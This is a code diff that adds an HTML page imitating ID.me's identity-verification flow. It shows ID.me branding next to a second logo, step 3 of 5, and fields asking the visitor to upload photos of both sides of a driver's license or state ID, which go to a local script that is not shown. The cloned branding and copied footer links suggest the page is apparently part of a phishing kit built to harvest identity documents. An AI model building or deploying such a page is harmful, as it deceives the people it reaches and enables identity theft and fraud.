@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="./css/auth.css">
+    <link rel="icon" type="image/png" sizes="32x32" href="../img/icon.ico">
+    <script src="https://kit.fontawesome.com/bcfb457481.js" crossorigin="anonymous"></script>
+    <title>Verify your identity - ID.me</title>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="../img/idme.svg">
+            <h2>+</h2>
+            <img src="../img/logo.svg">
+        </div>
+    </header>
+    <div class="container">
+        <h1 class="com">VERIFY YOUR IDENTITY</h1>
+        <div class="progress">
+            <div class="step">1</div>
+            <div class="step">2</div>
+            <div class="step active">3</div>
+            <div class="step">4</div>
+            <div class="step">5</div>
+        </div>
+        <h1 class="id com">Upload photo of your driver's license or state ID</h1>
+        <div class="id info">
+            <h3>Submitting a high-quality image of your document increases your likelihood of being verified the first time.</h3>
+        </div>
+        <div class="message">Please fill out all required fields.</div>
+        <figure class="id-box" id="front">
+            <img src="../img/front.png" id="front-image">
+            <figcaption>
+                <label for="file-upload" class="custom-file-upload" id="front-label">
+                    <p>Upload photo of driver's license or state ID</p>
+                    <p>(FRONT)</p>
+                </label>
+                <input type="file" id="front-upload" accept="image/*" style="display: none;">
+            </figcaption>
+        </figure>
+        <figure class="id-box" id="back">
+            <img src="../img/back.png" id="back-image">
+            <figcaption>
+                <label for="file-upload" class="custom-file-upload" id="back-label">
+                    <p>Upload photo of driver's license or state ID</p>
+                    <p>(BACK)</p>
+                </label>
+                <input type="file" id="back-upload" accept="image/*" style="display: none;">
+            </figcaption>
+        </figure>
+        <button class="btn" id="sub_id">Continue</button>
+        <div class="id-caution">
+            <h3>Please check the following to make sure your document can be processed:</h3>
+            <h4>The image is clear and not blurry (including your photo and/or barcode)</h4>
+            <h4>All information is visible (e.g., expiration date)</h4>
+        </div>
+    </div>
+    <footer>
+        <div class="language"><a href="">English</a></div>
+        <div class="link">
+                <div class="item"><a href="https://www.id.me/about?_ga=2.219718233.1547762766.1724082407-1041958704.1723783058">What is ID.me?</a></div>
+                <div class="item">|</div>
+                <div class="item"><a href="https://www.id.me/terms?_ga=2.10594804.1547762766.1724082407-1041958704.1723783058">Terms of Service</a></div>
+                <div class="item">|</div>
+                <div class="item"><a href="https://www.id.me/privacy?_ga=2.248761927.1547762766.1724082407-1041958704.1723783058">Privacy Policy</a></div>
+        </div>
+    </footer>
+    <div id="wait">Checking...</div>
+    <script src="./js/auth_id.js"></script>
+</body>
+</html>
